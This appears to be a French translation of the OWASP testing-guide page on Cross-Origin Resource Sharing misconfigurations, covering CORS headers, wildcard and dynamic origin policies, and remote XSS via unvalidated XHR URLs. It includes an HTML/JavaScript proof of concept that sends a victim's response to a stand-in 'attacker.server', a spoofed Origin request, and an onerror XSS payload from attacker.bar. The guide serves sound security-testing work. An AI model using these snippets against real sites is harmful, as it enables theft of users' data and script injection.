# Tester le partage de ressources inter-origines

|ID          |
|------------|
|WSTG-CLNT-07|

## Sommaire

[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) est un mécanisme qui permet à un navigateur Web d'effectuer des requêtes interdomaines à l'aide de XMLHttpRequest (XHR) niveau 2 (L2 ) API de manière contrôlée. Dans le passé, l'API XHR L1 n'autorisait que l'envoi de requêtes au sein de la même origine, car elle était restreinte par la [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) (SOP).

Les requêtes cross-origin ont un en-tête "Origin" qui identifie le domaine à l'origine de la requête et est toujours envoyé au serveur. CORS définit le protocole à utiliser entre un navigateur Web et un serveur pour déterminer si une requête cross-origin est autorisée. Les [en-têtes HTTP](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) sont utilisés pour accomplir cela.

La [spécification W3C CORS](https://www.w3.org/TR/cors/) stipule que pour les requêtes non simples, telles que les requêtes autres que GET ou POST ou les requêtes utilisant des informations d'identification, une requête OPTIONS avant le vol doit être envoyé à l'avance pour vérifier si le type de demande aura un impact négatif sur les données. La requête préliminaire vérifie les méthodes et les en-têtes autorisés par le serveur, et si les informations d'identification sont autorisées. En fonction du résultat de la requête OPTIONS, le navigateur décide si la requête est autorisée ou non.

### Origine et contrôle d'accès-Autoriser l'origine

L'en-tête de requête "Origin" est toujours envoyé par le navigateur dans une requête CORS et indique l'origine de la requête. L'en-tête Origin ne peut pas être modifié à partir de JavaScript car [le navigateur (l'agent utilisateur) bloque sa modification](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name) ; cependant, se fier à cet en-tête pour les vérifications de contrôle d'accès n'est pas une bonne idée car il peut être usurpé en dehors du navigateur, par exemple en utilisant un proxy, vous devez donc toujours vérifier que les protocoles au niveau de l'application sont utilisés pour protéger les données sensibles.

`Access-Control-Allow-Origin` est un en-tête de réponse utilisé par un serveur pour indiquer quels domaines sont autorisés à lire la réponse. Sur la base de la spécification CORS W3, il appartient au client de déterminer et d'appliquer la restriction d'accès du client aux données de réponse basées sur cet en-tête.

Du point de vue des tests de sécurité, vous devez rechercher des configurations non sécurisées, par exemple en utilisant un caractère générique `*` comme valeur de l'en-tête `Access-Control-Allow-Origin`, ce qui signifie que tous les domaines sont autorisés. Un autre exemple non sécurisé est lorsque le serveur renvoie l'en-tête d'origine sans aucune vérification supplémentaire, ce qui peut conduire à l'accès à des données sensibles. Notez que la configuration permettant d'autoriser les requêtes cross-origin est très peu sécurisée et n'est pas acceptable de manière générale, sauf dans le cas d'une API publique qui se veut accessible à tous.

### Access-Control-Request-Method & Access-Control-Allow-Method

L'en-tête "Access-Control-Request-Method" est utilisé lorsqu'un navigateur effectue une requête OPTIONS en amont et permet au client d'indiquer la méthode de requête de la requête finale. D'autre part, le `Access-Control-Allow-Method` est un en-tête de réponse utilisé par le serveur pour décrire les méthodes que les clients sont autorisés à utiliser.

### Access-Control-Request-Headers & Access-Control-Allow-Headers

Ces deux en-têtes sont utilisés entre le navigateur et le serveur pour déterminer quels en-têtes peuvent être utilisés pour effectuer une requête cross-origin.

### Access-Control-Allow-Credentials

Cet en-tête de réponse permet aux navigateurs de lire la réponse lorsque les informations d'identification sont transmises. Lorsque l'en-tête est envoyé, l'application Web doit définir une origine sur la valeur de l'en-tête `Access-Control-Allow-Origin`. L'en-tête `Access-Control-Allow-Credentials` ne peut pas être utilisé avec l'en-tête `Access-Control-Allow-Origin` dont la valeur est le caractère générique `*` comme suit :

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Validation des entrées

XHR L2 introduit la possibilité de créer une requête interdomaine à l'aide de l'API XHR pour une compatibilité descendante. Cela peut introduire des vulnérabilités de sécurité qui n'étaient pas présentes dans XHR L1. Les points intéressants du code à exploiter seraient les URL qui sont passées à XMLHttpRequest sans validation, surtout si les URL absolues sont autorisées car cela pourrait conduire à une injection de code. De même, une autre partie de l'application qui peut être exploitée est si les données de réponse ne sont pas échappées et nous pouvons les contrôler en fournissant une entrée fournie par l'utilisateur.

### Autres en-têtes

D'autres en-têtes sont impliqués, tels que `Access-Control-Max-Age`, qui détermine l'heure à laquelle une demande de contrôle en amont peut être mise en cache dans le navigateur, ou `Access-Control-Expose-Headers`, qui indique quels en-têtes peuvent être exposés en toute sécurité à l'API. d'une spécification d'API CORS.

Pour consulter les en-têtes CORS, reportez-vous au [document CORS MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).

## Objectifs des tests

- Identifier les terminaux qui implémentent CORS.
- Assurez-vous que la configuration CORS est sécurisée ou inoffensive.

## Comment tester

Un outil tel que [ZAP](https://www.zaproxy.org) peut permettre aux testeurs d'intercepter les en-têtes HTTP, ce qui peut révéler comment CORS est utilisé. Les testeurs doivent porter une attention particulière à l'en-tête d'origine pour savoir quels domaines sont autorisés. De plus, dans certains cas, une inspection manuelle du JavaScript est nécessaire pour déterminer si le code est vulnérable à l'injection de code en raison d'une mauvaise gestion des entrées fournies par l'utilisateur.

### Mauvaise configuration CORS

La définition du caractère générique sur l'en-tête `Access-Control-Allow-Origin` (c'est-à-dire `Access-Control-Allow-Origin : *`) n'est pas sécurisée si la réponse contient des informations sensibles. Bien qu'il ne puisse pas être utilisé avec `Access-Control-Allow-Credentials: true` en même temps, il peut être dangereux lorsque le contrôle d'accès est effectué uniquement par les règles de pare-feu ou les adresses IP source, autre que d'être protégé par des informations d'identification.

#### Wildcard Access-Control-Allow-Origin

Un testeur peut vérifier si `Access-Control-Allow-Origin: *` existe dans les messages de réponse HTTP.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

Si une réponse contient des données sensibles, un attaquant peut les voler en utilisant XHR :

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: attacker listener to steal response
                    xhr2.open("POST", "http://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
            xhr.open("GET", "http://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### Politique CORS dynamique

Une application Web ou une API moderne peut être implémentée pour autoriser dynamiquement les requêtes cross-origin, généralement afin d'autoriser les requêtes des sous-domaines comme suit :

```php
if (preg_match('|\.exemple.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

Dans cet exemple, toutes les requêtes provenant des sous-domaines de exemple.com seront autorisées. Il faut s'assurer que l'expression régulière utilisée pour la correspondance est complète. Sinon, s'il correspondait simplement à `exemple.com` (sans `$` ajouté), les attaquants pourraient contourner la politique CORS en ajoutant leur domaine à l'en-tête `Origin`.

```http
GET /test.php HTTP/1.1
Host: exemple.com
[...]
Origin: http://exemple.com.attacker.com
Cookie: <session cookie>
```

Lorsque la requête ci-dessus est envoyée, si la réponse suivante est renvoyée avec le `Access-Control-Allow-Origin` dont la valeur est la même que l'entrée de l'attaquant, l'attaquant peut lire la réponse par la suite et accéder aux informations sensibles qui ne sont accessibles que par un utilisateur victime.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: http://exemple.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

### Faiblesse de la validation des entrées

Le concept CORS peut être vu sous un angle complètement différent. Un attaquant peut autoriser délibérément sa politique CORS à injecter du code dans l'application Web cible.

#### XSS à distance avec CORS

Ce code fait une requête à la ressource passée après le caractère `#` dans l'URL, initialement utilisé pour obtenir des ressources dans le même serveur.

Code vulnérable :

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

Par exemple, une requête comme celle-ci affichera le contenu du fichier `profile.php` :

`http://exemple.foo/main.php#profile.php`

Requête et réponse générées par `http://exemple.foo/profile.php` :

```html
GET /profile.php HTTP/1.1
Host: exemple.foo
[...]
Referer: http://exemple.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

Maintenant, comme il n'y a pas de validation d'URL, nous pouvons injecter un script distant, qui sera injecté et exécuté dans le contexte du domaine `exemple.foo`, avec une URL comme celle-ci :

```text
http://exemple.foo/main.php#http://attacker.bar/file.php
```

Requête et réponse générées par `http://attacker.bar/file.php` :

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: http://exemple.foo/main.php
origin: http://exemple.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```

## Références

- [Fiche de triche de sécurité OWASP HTML5](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [Partage de ressources cross-origin MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
